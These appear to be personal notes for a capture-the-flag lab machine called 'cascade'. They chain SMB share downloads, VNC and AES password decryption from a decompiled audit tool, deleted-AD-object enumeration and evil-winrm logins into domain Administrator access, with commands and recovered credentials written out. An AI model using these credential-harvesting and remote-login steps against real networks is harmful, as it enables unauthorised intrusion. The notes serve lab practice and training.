	user Ryan Thompson
		cascadeLegacyPwd: clk0bjVldmE= (base64 encode of "rY4n5eva")

smbget -rR smb://r.thompson:rY4n5eva@10.129.226.53/Data/IT

have a look at ./Temp/s.smith/'VNC Install.reg'
	"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

found on the internet a msf script to decrypt the password : https://github.com/frizb/PasswordDecrypts
	password is "sT333ve2" for s.smith

use evil-winrm to open a powershell with s.smith creds
    sudo gem install evil-winrm
    evil-winrm -i cascade -u s.smith -p sT333ve2
	go to C:\Users\s.smith\Desktop
		type user.txt

smbclient \\\\10.129.226.53\\Audit$ -U s.smith -c 'prompt OFF;recurse ON;lcd ./Audit;mget *'
	cat ./Audit/RunAudit.bat
		see that this file executes CascAudit.exe with database ./Audit/DB/Audit.db
	file ./Audit/DB/Audit.db
		this file is a SQLite 3.x database
		use sqlitebrowser to read it
		field pwd for the user 'ArkSvc' in table Ldap : BQO5l5Kj9MdErXx6Q6AGOw==
		base64 decode has no sense -> encrypted password

decompile CascAudit.exe using dnSpy https://github.com/dnSpy/dnSpy/releases
    can be run on Linux by using wine64 'sudo apt install wine64'
        wine dnSpy.exe
            AES128 encryption with key c4scadek3y654321 with mode 1 (CBC) thus initial IV 1tdyjCbY1Ix49842
            now we have every element to decrypt the password -> w3lc0meFr31nd

evil-winrm -i cascade -u ArkSvc -p w3lc0meFr31nd
    Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
        The profile TempAdmin that was seen in the email at the beginning of the box is present in the AD bin
    Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE)(DisplayName=TempAdmin))" -IncludeDeletedObjects -Properties *
        we can find a cascadeLegacyPwd field with the string YmFDVDNyMWFOMDBkbGVz
        base64 decode -> baCT3r1aN00dles

TempAdmin account is disabled HOWEVER it was said in the email that the password of the TempAdmin profile was the same as the Administrator's

=> evil-winrm -i cascade -u Administrator -p baCT3r1aN00dles
    cd C:/Users/Administrator/Desktop
    type root.txt
        => root flag !
